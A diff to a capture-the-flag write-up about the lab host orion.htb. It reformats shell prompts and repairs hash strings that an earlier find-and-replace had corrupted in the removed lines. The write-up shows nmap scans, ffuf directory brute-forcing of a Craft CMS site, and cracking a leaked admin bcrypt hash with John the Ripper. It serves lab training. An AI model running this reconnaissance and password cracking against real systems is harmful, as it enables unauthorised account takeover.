@@ -25,7 +25,8 @@ As usual we start with port scanning to identify what services are running on th
 first a simple port scan .
 
 ```bash
-tr3m0x@blackhat$ sudo nmap -p- --min-rate 1000 -T4 -oN scans/ports.nmap 10.129.244.146
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ sudo nmap -p- --min-rate 1000 -T4 -oN scans/ports.nmap 10.129.244.146
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-30 22:02 +0100
 Warning: 10.129.244.146 giving up on port because retransmission cap hit (6).
 Nmap scan report for 10.129.244.146
@@ -41,7 +42,8 @@ Nmap done: 1 IP address (1 host up) scanned in 95.59 seconds
 Okay so we have only two open ports `ssh` and `http`.<br>
 Then a deeper scan .
 ```bash
-tr3m0x@blackhat$ sudo nmap -sC -sV -p 22,80 -oN scans/deepscan.nmap 10.129.244.146
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ sudo nmap -sC -sV -p 22,80 -oN scans/deepscan.nmap 10.129.244.146
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-30 22:10 +0100
 Nmap scan report for 10.129.244.146
 Host is up (0.14s latency).
@@ -64,7 +66,8 @@ Nice! On port 80 we got a redirect to  `http://orion.htb`.
 
 Let's first add the domain we found to the hosts file.
 ```bash
-tr3m0x@blackhat$ echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
 ```
 Now let's visit it in the browser.
 
@@ -73,7 +76,8 @@ Now let's visit it in the browser.
 The website appears to be a custom implementation built using **Craft CMS**, a flexible and powerful content management system.<br><br>
 My next move was directory enumeration
 ```bash
-tr3m0x@blackhat$ ffuf -u http://orion.htb/FUZZ -w tr3m0x@blackhat$SECLISTS/Discovery/Web-Content/raft-small-directories.txt
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ ffuf -u http://orion.htb/FUZZ -w $SECLISTS/Discovery/Web-Content/raft-small-directories.txt
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/ 
@@ -312,13 +316,15 @@ The most critical table for our purposes is the `users` table, which contains au
 Upon inspection, the database contains a single administrative user (admin) with the following password hash
 
 ```text
-admin:tr3m0x@blackhat$2ytr3m0x@blackhat$13tr3m0x@blackhat$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
+admin:$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
 ```
 Using John the Ripper with the RockYou wordlist, we attempt to crack the bcrypt hash
 ```bash
-tr3m0x@blackhat$ echo 'admin:tr3m0x@blackhat$2ytr3m0x@blackhat$13tr3m0x@blackhat$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ echo 'admin:$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
 
-tr3m0x@blackhat$ john hash --wordlist=tr3m0x@blackhat$ROCKYOU
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ john hash --wordlist=$ROCKYOU
 Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
 Use the "--format=bcrypt-opencl" option to force loading these as that type instead
 Using default input encoding: UTF-8
